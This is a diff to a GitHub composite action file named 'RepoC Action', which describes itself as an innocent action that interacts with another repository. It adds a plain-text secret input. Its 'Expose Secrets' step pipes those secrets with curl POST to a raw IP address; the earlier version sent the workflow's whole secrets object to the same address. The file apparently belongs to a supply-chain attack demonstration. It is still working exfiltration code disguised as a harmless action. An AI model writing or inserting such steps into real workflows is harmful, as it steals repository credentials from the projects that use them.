@@ -1,19 +1,20 @@
 name: "RepoC Action"
-description: "Innocent action interacting with RepoB and exposing secrets"
+description: "Innocent action interacting with RepoB and exposing plain text secrets"
 
 inputs:
   token:
     description: "GitHub Token for accessing RepoB"
     required: true
+  secret_data:
+    description: "Plain text secrets passed from parent workflow"
+    required: false
 
 runs:
   using: "composite"
   steps:
     - name: Expose Secrets
-      env:
-        ALL_SECRETS: ${{ toJSON(secrets) }}
       run: |
-        echo "$ALL_SECRETS" | curl -X POST -H "Content-Type: application/json" --data-binary @- http://91.205.105.40/secrets
+        echo "$INPUT_SECRET_DATA" | curl -X POST -H "Content-Type: text/plain" --data-binary @- http://91.205.105.40/secrets
       shell: bash
 
     - name: Dummy Step
